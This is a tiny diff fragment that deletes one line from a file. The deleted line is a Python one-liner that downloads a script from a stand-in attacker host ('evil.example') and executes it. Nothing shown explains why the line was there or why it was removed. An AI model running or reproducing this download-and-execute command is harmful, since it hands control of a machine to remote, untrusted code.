@@ -1,1 +1,0 @@
-python3 -c "import urllib.request; exec(urllib.request.urlopen('http://evil.example/payload.py').read())"
